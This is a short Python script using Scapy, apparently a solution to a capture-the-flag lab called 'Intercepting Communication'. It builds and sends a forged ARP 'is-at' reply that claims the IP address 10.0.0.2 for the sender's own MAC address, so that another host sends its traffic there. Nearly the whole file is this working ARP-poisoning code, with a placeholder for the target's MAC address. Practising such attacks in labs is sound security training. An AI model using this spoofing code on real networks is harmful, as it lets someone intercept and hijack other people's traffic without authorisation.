#! /usr/bin/env python
# ===== Welcome to Intercepting Communication! =====
# In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
# In this challenge you will hijack traffic from a remote host using ARP.
# You do not have the capabilities of a NET ADMIN.
# The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.

import sys
from scapy.all import *

SRC_HOST = get_if_hwaddr("eth0")
DEST_HOST = "change_with_mac_address_of_target" # arping
BRDCT = "ff:ff:ff:ff:ff:ff"
IP_SRC = "10.0.0.2"
IP_DEST = "10.0.0.3"

ETHER = Ether(src=SRC_HOST,dst=DEST_HOST)
ARP_ = ARP(op="is-at", psrc=IP_SRC, hwsrc=SRC_HOST, hwdst=DEST_HOST)

# Craft the ARP packet
send_packet = ETHER / ARP_

print("prepare sending ARP...")
# Send the poisoned ARP to received the flag 
sendp(send_packet, iface="eth0") #iface for receiving on eth0
